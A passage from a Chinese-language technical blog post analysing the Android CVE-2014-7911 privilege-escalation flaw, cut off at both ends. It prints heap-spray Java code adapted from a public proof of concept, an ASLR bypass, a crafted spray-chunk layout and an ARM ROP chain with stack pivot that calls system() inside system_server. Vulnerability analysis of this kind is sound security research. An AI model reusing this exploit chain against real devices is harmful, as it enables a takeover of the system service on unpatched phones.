class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	blx r2 ; &amp;lt;—— controlled;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们可以看到这里使用了三层指针的跳转，最终才拿到控制权。mOrgue需要指向攻击者可控的内存，怎样做到？下面我将结合参考文献以及retme7提供的POC进行翻译和理解。&lt;/p&gt;
&lt;h2 id=&quot;漏洞利用&quot;&gt;&lt;a href=&quot;#漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用&quot;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;h3 id=&quot;绕过ASLR&quot;&gt;&lt;a href=&quot;#绕过ASLR&quot; class=&quot;headerlink&quot; title=&quot;绕过ASLR&quot;&gt;&lt;/a&gt;绕过ASLR&lt;/h3&gt;&lt;p&gt;Android有做地址空间随机化ASLR，但是所有的app都是fork自zygote进程，基础模块的内存布局全部是相同的，也就是说我们可以简单的绕过system_server的ASLR。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Dalvik-heap-spary&quot;&gt;&lt;a href=&quot;#Dalvik-heap-spary&quot; class=&quot;headerlink&quot; title=&quot;Dalvik-heap spary&quot;&gt;&lt;/a&gt;Dalvik-heap spary&lt;/h3&gt;&lt;p&gt;Dalvik-heap是储存Java对象实例的一片由Dalvik虚拟机管理的内存区，它的内存布局也是来自zygote进程，在所有app进程中都是相同的。&lt;br&gt;system_server进程向android设备提供绝大部分的系统服务，通过这些服务的一些特定方法我们可以向system_server传输一个String，同时system_server把这个String存储在Dalvik-heap中不被销毁（因为我们需要使用注入代码段对这片内存区域进行填充）。&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;heapSpary&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String str)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//    str = str + generateString(16);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        IntentFilter inFilter = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; IntentFilter();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//        inFilter.addAction(generateString(16));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        registerReceiver(broadcastReceiver, inFilter, str, &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我屏蔽了retme7的POC中的两行代码，经过测试并没有影响。&lt;br&gt;首先，看一下registerReceiver方法的声明：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public Intent registerReceiver(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中broadcastPermission参数为一个String类型，方法调用完成后，String buffer将常驻system_server内存空间，并且不会被销毁。接下来，将结合Android4.4.4_r1源码简单分析下registerReceiver方法是如何将String传递进并常驻在system_server进程的：&lt;br&gt;&lt;code&gt;ContextWrapper.registerReceiver-&amp;gt;ContextImpl.registerReceiver-&amp;gt;ContextImpl.registerReceiverInternal-&amp;gt;ActivityManagerProxy.registerReceiver-&amp;gt;ActivityManagerService.registerReceiver&lt;/code&gt;&lt;br&gt;注意ActivityManagerProxy.registerReceiver方法里通过Binder驱动程序就进入到了ActivityManagerService中的registerReceiver方法中，也就是进入到了system_server进程里。&lt;br&gt;贴出ActivityManagerService.registerReceiver方法的关键部分：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; Intent &lt;span class=&quot;title&quot;&gt;registerReceiver&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; userId)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;enforceNotIsolatedCaller(&lt;span class=&quot;string&quot;&gt;&quot;registerReceiver&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; callingUid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; callingPid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;synchronized&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    ReceiverList rl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	        = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    ......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    BroadcastFilter bf = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; BroadcastFilter(filter, rl, callerPackage,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            permission, callingUid, userId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    rl.add(bf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    ......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; sticky;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;通过&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BroadcastFilter bf = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; BroadcastFilter(filter, rl, callerPackage,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       permission, callingUid, userId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rl.add(bf);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;就将传递进的String buffer即此处的permission常驻在system_server内存空间。&lt;br&gt;最后反复调用heapSpary，完成Dalvik-heap spary：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    heapSpary(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (i % &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Log.d(TAG, &lt;span class=&quot;string&quot;&gt;&quot;heap sparying... &quot;&lt;/span&gt; + i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Spray-addresses-manipulation&quot;&gt;&lt;a href=&quot;#Spray-addresses-manipulation&quot; class=&quot;headerlink&quot; title=&quot;Spray addresses manipulation&quot;&gt;&lt;/a&gt;Spray addresses manipulation&lt;/h3&gt;&lt;p&gt;方便请见，再次贴出实现代码执行的约束条件：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(*(*(mOrgue+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	refs = *(mOrgue+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	r2 = *(*(*(refs+&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;))+&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	blx r2 ; &amp;lt;—— controlled;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;完成system_server进程的堆喷射后，我们遇到另一个问题-虽然我们的spray chunk充满了system_server内存空间，mOrgue也确实指向可读的spray chunk，然而我们上面提到由于此漏洞的特殊型，需要控制其三重指针的调用，所以我们还需要构造特殊的spray chunk，使得mOrgue每次指向相同的偏移。&lt;br&gt;下面是构造后的spray chunk的结构图（图来自参考文献）：&lt;br&gt;&lt;img src=&quot;/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;简单解释一下：&lt;br&gt;STATIC_ADDRESS是我们传递进来的mOrgue&lt;br&gt;GADGET_CHUNK_OFFSET是GADGET_CHUNK在spray chunk的偏移&lt;br&gt;STATIC_ADDRESS = Beginning_of_spray + 4 * N&lt;br&gt;[STATIC_ADDRESS] = STATIC_ADDRESS + GADGET_CHUNK_OFFSET - 4 * N&lt;br&gt;    = Beginning_of_spray + 4 * N + GADGET_CHUNK_OFFSET - 4 * N&lt;br&gt;    = Beginning_of_spray + GADGET_CHUNK_OFFSET&lt;br&gt;    =  GADGET_CHUNK_ADDR&lt;br&gt;这样只要确保STATIC_ADDRESS每次都位于Relative Addresses Chunk区域（spray chunk中Relative Addresses Chunk的比例远大于Gadget Chunk），就可保证STATIC_ADDRESS每次都指向GADGET_CHUNK_ADDR。&lt;br&gt;重新回头分析汇编代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ldr r4, [r0, #4]   # r0为this指针，r4为mRefs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r6, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r0, r4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx &amp;lt;android_atomic_dec ()&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp r0, #1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;为了控制后续程序流程，r0的值必须为1&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ldr r4, [r0, #4] --&amp;gt; r4=[STATIC_ADDRESS + 4] --&amp;gt; r4=GADGET_CHUNK_ADDR - 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;[r4]的值为1，即[GADGET_CHUNK_ADDR - 4]的值为1。cmp比较成立，进入下面的汇编代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;r4=GADGET_CHUNK_ADDR - 4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r0, [r4, #8]    # r4 = &amp;amp;refs-&amp;gt;mStrong&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r0=[GADGET_CHUNK_ADDR + 4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r1, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r3, [r0, #0] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r3=[[GADGET_CHUNK_ADDR + 4]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;为了方便之后的布局，设置[GADGET_CHUNK_ADDR + 4] =STATIC_ADDRESS + 12，则：&lt;br&gt;&lt;code&gt;r3=[STATIC_ADDRESS + 12]&lt;/code&gt;&lt;br&gt;&lt;code&gt;r3=GADGET_CHUNK_ADDR - 12&lt;/code&gt;&lt;br&gt;接着往下看：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ldr r2, [r3, #12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r2=[GADGET_CHUNK_ADDR]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx r2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这样，我们就完成了spary chunk的布局，Spray addresses manipulation完毕&lt;/p&gt;
&lt;h3 id=&quot;ROP&quot;&gt;&lt;a href=&quot;#ROP&quot; class=&quot;headerlink&quot; title=&quot;ROP&quot;&gt;&lt;/a&gt;ROP&lt;/h3&gt;&lt;p&gt;由于DEP（Data Execution Prevention）的原因，Dalvik堆上的内存不能用来执行。需要通过ROP技术绕过DEP，执行代码（我们选择执行system函数，然后通过system函数调用外部程序）。&lt;br&gt;这里首先用到了一个寻找ROP链的工具：&lt;br&gt;&lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/JonathanSalwan/ROPgadget&lt;/a&gt;&lt;br&gt;注意：&lt;br&gt;只用基础模块:libc libandroid_runtime …（会被zygote加载的模块，保证内存布局的一致）&lt;br&gt;可以把arm code当做thumb code来搜索,增加更多的可能&lt;br&gt;为了控制R0寄存器使其指向system函数的参数（命令字符串），我们选择用stack pivot（将控制的堆内存交换栈上,即复写SP）技术将字符串压入堆栈，然后通过pop将字符串地址赋给R0。&lt;br&gt;第一个gadget：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;r5=STATIC_ADDRESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r7, [r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r7=GADGET_CHUNK_ADDR&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r0, r5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r0=STATIC_ADDRESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldr r1, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r1=[GADGET_CHUNK_ADDR + 8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx r1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;通过r1跳转到第二个gadget：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;r7=GADGET_CHUNK_ADDR&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add.w r7, r7, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r7=GADGET_CHUNK_ADDR + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov sp, r7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sp = GADGET_CHUNK_ADDR + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop &amp;#123;r4, r5, r7, pc&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r4=[GADGET_CHUNK_ADDR + 8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r5=[GADGET_CHUNK_ADDR + 12]=system_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r7=[GADGET_CHUNK_ADDR + 16]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pc=[GADGET_CHUNK_ADDR + 20]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里我提前将system函数的地址写入[GADGET_CHUNK_ADDR + 12]。&lt;br&gt;有一个问题，为什么要通过第一个gadget的过渡，才完成stack pivot？&lt;br&gt;答:事实上是不得已而为之，我用ROPgadget扫描了整个/system/lib目录下的基础模块的”mov sp, r”，只发现有mov sp, r7，所以只能采取这种过度的方式。&lt;br&gt;继续来到第三个gadget：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sp=[GADGET_CHUNK_ADDR + 24]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov r0, sp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r5=system_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;blx 